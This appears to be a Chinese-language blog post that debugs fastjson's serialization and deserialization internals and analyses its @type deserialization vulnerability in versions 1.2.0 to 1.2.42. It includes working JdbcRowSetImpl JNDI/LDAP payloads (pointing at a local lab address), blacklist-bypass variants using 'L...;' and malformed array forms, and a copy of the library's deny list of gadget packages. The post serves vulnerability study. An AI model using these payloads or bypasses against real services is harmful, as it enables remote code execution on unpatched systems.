+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先简单使用上手一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> lombok.ToString;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        a.setName(<span class="string">&quot;sakuya&quot;</span>);</span><br><span class="line">        a.setAge(<span class="number">12</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;开始转换为json数据&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(a);</span><br><span class="line"></span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/fastjson/image-20260424135526708.png" alt="image-20260424135526708"></p>
+<p>根据输出结果可以得到 在转换为json数据时 会调用对象中的getter方法去获取具体属性的值</p>
+<h3 id="调试一下对象-to-json的源码"><a href="#调试一下对象-to-json的源码" class="headerlink" title="调试一下对象 to json的源码"></a>调试一下对象 to json的源码</h3><p><img src="/2026/04/24/fastjson/image-20260424140524553.png" alt="image-20260424140524553"></p>
+<p>进过多层方法调用</p>
+<p><img src="/2026/04/24/fastjson/image-20260424140541839.png" alt="image-20260424140541839"></p>
+<p>获取SerializeWriter out 用来装我们的json数据的</p>
+<p><img src="/2026/04/24/fastjson/image-20260424140938379.png" alt="image-20260424140938379"></p>
+<p>JSONSerializer用来序列化我们的Object对象 重点来到这个write方法</p>
+<p><img src="/2026/04/24/fastjson/image-20260424141054116.png" alt="image-20260424141054116"></p>
+<p>write方法中会获取对象的class类 再获取这个class的对象writer</p>
+<p>跟进this.getObjectWriter(clazz)</p>
+<p><img src="/2026/04/24/fastjson/image-20260424141305627.png" alt="image-20260424141305627"></p>
+<p>层层调用到这个方法里</p>
+<p><img src="/2026/04/24/fastjson/image-20260424141542159.png" alt="image-20260424141542159"></p>
+<p>上面的逻辑是要找可以序列化这个类的对象writer </p>
+<p>由于是我们自己写的 找不到这个class类的writer 最后直接将他放入SerializeConfig里面 </p>
+<p><img src="/2026/04/24/fastjson/image-20260424142012047.png" alt="image-20260424142012047"></p>
+<p>最后再次获取writer </p>
+<p>writer 包含了之前的java对象的大部分信息 还获取了所有的getter方法</p>
+<p><img src="/2026/04/24/fastjson/image-20260424142315381.png" alt="image-20260424142315381"></p>
+<p>回到这里 开始序列化</p>
+<p><img src="/2026/04/24/fastjson/image-20260424142421292.png" alt="image-20260424142421292"></p>
+<p>序列化结束就直接输出</p>
+<p><img src="/2026/04/24/fastjson/image-20260424142813708.png" alt="image-20260424142813708"></p>
+<p>总的来说 这里的序列化是使用了对象中的getter方法 然后获取到对象属性值</p>
+<p>这里的序列化和java原生的序列化不同 并没有使用read方法</p>
+<hr>
+<h3 id="反序列化-json-to-javabean对象"><a href="#反序列化-json-to-javabean对象" class="headerlink" title="反序列化 json to javabean对象"></a>反序列化 json to javabean对象</h3><p>反序列化的时候有3个方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JSON.parse()</span><br><span class="line">JSON.parseObject()</span><br><span class="line">JSON.parseArrary()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/fastjson/image-20260424143422887.png" alt="image-20260424143422887"></p>
+<p>获取到的json数据 直接原样输出了 从结果上来看并没有进行正确的反序列化</p>
+<p>因为这里解析器不知道要转化为什么对象 所以默认会转换为JSONObject对象</p>
+<p><img src="/2026/04/24/fastjson/image-20260424143748078.png" alt="image-20260424143748078"></p>
+<p>给定了要转换的class类 成功转换</p>
+<p>从输出上可以知道转换的时候调用了setter和getter方法</p>
+<p>先来调试一下parse方法</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144007014.png" alt="image-20260424144007014"></p>
+<p><img src="/2026/04/24/fastjson/image-20260424144149544.png" alt="image-20260424144149544"></p>
+<p>创建DefaultJSONParser实例</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144219987.png" alt="image-20260424144219987"></p>
+<p>会先调用上面的方法 JSONScanner会去扫描我们json数据 返回一个JSONLexer</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144420533.png" alt="image-20260424144420533"></p>
+<p>这里会判断json数据里面第一个字符是什么 然后next 换到下一个</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144346831.png" alt="image-20260424144346831"></p>
+<p>开始尝试反序列化</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144523795.png" alt="image-20260424144523795"></p>
+<p>根据当前字符判断 应该干什么</p>
+<p>这里的前面基本都是去解析json数据格式的逻辑 还没到我们想要的</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144650474.png" alt="image-20260424144650474"></p>
+<p>这里会创建一个JSONObject对象 是用来后面进行对象转换用的 </p>
+<p><img src="/2026/04/24/fastjson/image-20260424144851035.png" alt="image-20260424144851035"></p>
+<p>这里返回的对象是空的</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144917869.png" alt="image-20260424144917869"></p>
+<p>这里的parseObject也是判断json数据格式用的</p>
+<p><img src="/2026/04/24/fastjson/image-20260424145956988.png" alt="image-20260424145956988"></p>
+<p>这里会获取key 记住lexer.ScanSymbol方法 会获取一个键名</p>
+<p><img src="/2026/04/24/fastjson/image-20260424144943101.png" alt="image-20260424144943101"></p>
+<p>重点来到这里</p>
+<p><img src="/2026/04/24/fastjson/image-20260424145051538.png" alt="image-20260424145051538"></p>
+<p>这里的key和DEFAULT_TYPE_KEY比较重要</p>
+<p>key的值是我们的一个键的名字 DEFAULT_TYPE_KEY是@type</p>
+<p><img src="/2026/04/24/fastjson/image-20260424145306058.png" alt="image-20260424145306058"></p>
+<p>这里默认就会是true 也就是说只要前面的key成立就会执行</p>
+<p>如果判断成立就会获取对象类型 typeName 也就是我们想转换为的对象 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里会获取第一个键值并loadclass</p>
+<p><strong>这么来看 在源码中存在一个自定义加载类的功能</strong> 前提是你的第一个键名要是**@type** 并且值为你要转换的类的全限定包名</p>
+<p>我们这里就没有设置 所以就会掉过了</p>
+<p>最后就直接输出原来的json数据了</p>
+<p><img src="/2026/04/24/fastjson/image-20260424150501749.png" alt="image-20260424150501749"></p>
+<p>后续会搞成JSONObject对象 （但是这都不重要了</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2026/04/24/fastjson/image-20260424151126959.png" alt="image-20260424151126959"></p>
+<p>反序列化的时候 我们可以在json数据里面 第一个键的位置写一个@type并写入任意一个类 这样在反序列化的时候解析器会自动的解析成这个类</p>
+<p>前面调用的时候 又知道会调用setter或者getter方法 那么基本了解为什么会导致漏洞了</p>
+<hr>
+<p>可以加载任意一个类 并且还会调用getter setter方法</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>（类加载） <code>com.sun.rowset.JdbcRowSetImpl</code>（jndi）这些类都在fsatjson反序列化的时候触发</p>
+<hr>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="私有属性-共有属性"><a href="#私有属性-共有属性" class="headerlink" title="私有属性 共有属性"></a>私有属性 共有属性</h4><p>在没有setter方法的时候 并且属性是私有属性 不会被赋值</p>
+<p><img src="/2026/04/24/fastjson/image-20260424151511635.png" alt="image-20260424151511635"></p>
+<p><img src="/2026/04/24/fastjson/image-20260424151552612.png" alt="image-20260424151552612"></p>
+<p>但是getter方法仍然被调用了</p>
+<p>当属性为共有属性的时候并且也没有getter的时候 仍然可以赋值</p>
+<p><img src="/2026/04/24/fastjson/image-20260424151726283.png" alt="image-20260424151726283"></p>
+<h4 id="私有属性仍然想被赋值该怎么办"><a href="#私有属性仍然想被赋值该怎么办" class="headerlink" title="私有属性仍然想被赋值该怎么办"></a>私有属性仍然想被赋值该怎么办</h4><p>添加参数 <code>Feature.SupportNonPublicField</code></p>
+<p><code>JSON.parse(jsonstring,Feature.SupportNonPublicField)</code></p>
+<p>即可被赋值</p>
+<p><img src="/2026/04/24/fastjson/image-20260424154018151.png" alt="image-20260424154018151"></p>
+<h4 id="getter-setter"><a href="#getter-setter" class="headerlink" title="getter setter"></a>getter setter</h4><p>然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。</p>
+<p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</strong></p>
+<p>满足条件的setter：</p>
+<ul>
+<li>非静态函数</li>
+<li>返回类型为void或当前类</li>
+<li>参数个数为1个</li>
+</ul>
+<p>满足条件的getter：</p>
+<ul>
+<li>非静态方法</li>
+<li>无参数</li>
+<li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li>
+</ul>
+<p>具体源码可以看这位师傅的调试过程</p>
+<p><a target="_blank" rel="noopener" href="https://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37">fastjson基础</a></p>
+<hr>
+<h2 id="fastjson漏洞分析"><a href="#fastjson漏洞分析" class="headerlink" title="fastjson漏洞分析"></a>fastjson漏洞分析</h2><p>说了这么多 直接来试试漏洞利用</p>
+<h3 id="1-2-0-1-2-24"><a href="#1-2-0-1-2-24" class="headerlink" title="1.2.0~1.2.24"></a>1.2.0~1.2.24</h3><p>对于@type加载类没有任何限制 所以可以直接打</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/fastjson/image-20260424155245601.png" alt="image-20260424155245601"></p>
+<h4 id="分析一下"><a href="#分析一下" class="headerlink" title="分析一下"></a>分析一下</h4><p><img src="/2026/04/24/fastjson/image-20260424155535388.png" alt="image-20260424155535388"></p>
+<p>直接来到这里</p>
+<p><img src="/2026/04/24/fastjson/image-20260424155632629.png" alt="image-20260424155632629"></p>
+<p><img src="/2026/04/24/fastjson/image-20260424155735785.png" alt="image-20260424155735785"></p>
+<p>根据前面的分析 这里最为重要</p>
+<p><img src="/2026/04/24/fastjson/image-20260424155803507.png" alt="image-20260424155803507"></p>
+<p>判断第一个键名为@type 进入判断语句</p>
+<p>获取typeName</p>
+<p>开始加载这个类</p>
+<p><img src="/2026/04/24/fastjson/image-20260424155848385.png" alt="image-20260424155848385"></p>
+<p>下面有2个奇怪的判断语句 在这个版本区间还没用</p>
+<p><img src="/2026/04/24/fastjson/image-20260424155930529.png" alt="image-20260424155930529"></p>
+<p>这里的逻辑是通过查找mappings中有点class类去加载 显然这里是不可能有的</p>
+<p><img src="/2026/04/24/fastjson/image-20260424160047056.png" alt="image-20260424160047056"></p>
+<p>获取当前线程的类加载器 去加载</p>
+<p><img src="/2026/04/24/fastjson/image-20260424160126431.png" alt="image-20260424160126431"></p>
+<p>加载成功 并把这个class类放入mapping中 返回加载的class类</p>
+<p><img src="/2026/04/24/fastjson/image-20260424160227564.png" alt="image-20260424160227564"></p>
+<p>也是获取deserializer然后去进行反序列化</p>
+<p>反序列化的时候就触发了getter方法然后触发漏洞了</p>
+<h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>这个版本区间没有做任何的限制 可以随便打</p>
+<hr>
+<h3 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25~1.2.41"></a>1.2.25~1.2.41</h3><p>从这个版本开始 就添加了黑名单和白名单和AutoType的限制</p>
+<h4 id="分析一下-1"><a href="#分析一下-1" class="headerlink" title="分析一下"></a>分析一下</h4><p>我们在拿之前的payload打一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2026/04/24/fastjson/image-20260426130735792.png" alt="image-20260426130735792"></p>
+<p>提示我们autoType不支持这个类</p>
+<p>我们继续调试一下</p>
+<p><img src="/2026/04/24/fastjson/image-20260426130922921.png" alt="image-20260426130922921"></p>
+<p>重点关注这个地方 之前就是在这里把我们想要加载的类给放到mapping中的</p>
+<p>现在这里多了个checkAutoType的函数</p>
+<p>跟进一下</p>
+<p><img src="/2026/04/24/fastjson/image-20260426131125376.png" alt="image-20260426131125376"></p>
+<p>这里面需要autoTypeSupport为true 后面还有白名单和黑名单的检测 </p>
+<p>expectClass默认也是null 所以要想成功加载类 就必须要使得autoTypeSupport为true</p>
+<p>我们看看这个类</p>
+<p><img src="/2026/04/24/fastjson/image-20260426131232465.png" alt="image-20260426131232465"></p>
+<p>默认情况autoTypeSuppory为false</p>
+<p>并且denylist里面有很多的包 acceptlist里面默认是空的</p>
+<p><img src="/2026/04/24/fastjson/image-20260426131416977.png" alt="image-20260426131416977"></p>
+<p>后续是先黑名单检测然后再白名单 但是黑名单检测就过不了就直接抛出异常了</p>
+<p>黑名单里面的包有这些</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.denyList = </span><br><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>我们先把这个autoTypeSuppory参数设置为true在打打看</p>
+<p><img src="/2026/04/24/fastjson/image-20260426131719853.png" alt="image-20260426131719853"></p>
+<p><img src="/2026/04/24/fastjson/image-20260426131910213.png" alt="image-20260426131910213"></p>
+<p>函数checkAutoType函数这里 如果autoTypeSuppory为true 是<strong>先白名单之后再黑名单</strong> 如果白名单过了就直接加载这个类</p>
+<p>但是默认情况白名单就是空的 所以得尝试绕过黑名单</p>
+<p>我们先修改一下我们的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;acom.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里@type的值变为acom.sun.rowset.JdbcRowSetImpl 显然是不可能在黑名单里面的</p>
+<p><img src="/2026/04/24/fastjson/image-20260426132504510.png" alt="image-20260426132504510"></p>
+<p>继续来到这里 显然是可以绕过黑名单的 我们看看后续逻辑</p>
+<p><img src="/2026/04/24/fastjson/image-20260426132918313.png" alt="image-20260426132918313"></p>
+<p>来到这里的loadClass 之前也是在这个地方把我们的类给加到mapping中 成功加载类</p>
+<p>继续跟进一下</p>
+<p><img src="/2026/04/24/fastjson/image-20260426133020943.png" alt="image-20260426133020943"></p>
+<p>在这里面有2个奇怪的判断 </p>
+<p>第一个判断是检测第一个字符是不是<code>[</code> 左中括号 如果是的话会加载这个类 最后返回一个数组 里面有我们要加载的class对象</p>
+<p>第二个判断是检测首尾字符分别是否是<code>L</code>和<code>;</code> 如果是的话就去到首尾字符 加载这个类</p>
+<p>在之前的那个版本里面 这里的判断我们没有去管</p>
+<p><img src="/2026/04/24/fastjson/image-20260426133531421.png" alt="image-20260426133531421"></p>
+<p>因为后面也会将我们的类加入这个mappings里面 后面就会加载这个类 </p>
+<p>但是在现在 我们这个类实际没法被加载 所以得通过上面的2个判断语句去加载我们的类</p>
+<p>于是现在的payload就变成了这样</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>先试第一种</p>
+<p><img src="/2026/04/24/fastjson/image-20260426133826062.png" alt="image-20260426133826062"></p>
+<p>继续来到这里</p>
+<p><img src="/2026/04/24/fastjson/image-20260426133901974.png" alt="image-20260426133901974"></p>
+<p>通过类第二个检测 开始加载类了 这里的效果就是重新一次loadClass这个函数</p>
+<p>后续就是成功将这个类加入mappings里面 后面就和之前的一样了 反序列化之后就成功触发getter从而触发漏洞</p>
+<p><img src="/2026/04/24/fastjson/image-20260426134045622.png" alt="image-20260426134045622"></p>
+<p><img src="/2026/04/24/fastjson/image-20260426134130147.png" alt="image-20260426134130147"></p>
+<p><img src="/2026/04/24/fastjson/image-20260426134146055.png" alt="image-20260426134146055"></p>
+<p>成功执行</p>
+<p>我们使用第二个payload试试</p>
+<p><img src="/2026/04/24/fastjson/image-20260426134238385.png" alt="image-20260426134238385"></p>
+<p>理论这里应该就可以了 但是这里报错提示第43个字符需要是<code>[</code></p>
+<p>我们继续修改payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/fastjson/image-20260426134425595.png" alt="image-20260426134425595"></p>
+<p>有提示要是<code>{</code> 而不是<code>,</code></p>
+<p>继续修改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/fastjson/image-20260426134518405.png" alt="image-20260426134518405"></p>
+<p>这下成功了 成功实现数组绕过</p>
+<p>其实这里很奇怪 为什么要这么畸形的json数据他会去加载这个类 虽然根据报错修改了payload最后也成功执行了</p>
+<p>后面也看了一下源代码 就是在分析的时候<strong>不符合fastjson对数据格式的要求就是了</strong> 感觉这个形式就很奇怪</p>
+<p>可以自己动手去调试一下</p>
+<p>但是也确实绕过去了</p>
+<h4 id="总结一下-1"><a href="#总结一下-1" class="headerlink" title="总结一下"></a>总结一下</h4><p>这个版本添加了autoTypeSuppory 和 黑白名单 </p>
+<p>可以通过在类名单首尾添加<code>L</code>  和 <code>;</code>绕过</p>
+<p>也可以通过构造畸形的数组形式绕过</p>
+<p>这里的前提就是autoTypeSuppory 要为true</p>
+<hr>
+<h3 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>继续直接打 然后看报错信息是个什么情况</p>
+<p><img src="/2026/04/24/fastjson/image-20260426135418773.png" alt="image-20260426135418773"></p>
+<h4 id="分析一下-2"><a href="#分析一下-2" class="headerlink" title="分析一下"></a>分析一下</h4><p>提示不支持 调试看看</p>
+<p><img src="/2026/04/24/fastjson/image-20260426135450785.png" alt="image-20260426135450785"></p>
+<p>现在ParserConfig里面的黑名单直接玩起hash表了 没法直接看懂黑名单里面有哪些包名</p>
+<p><img src="/2026/04/24/fastjson/image-20260426135707172.png" alt="image-20260426135707172"></p>
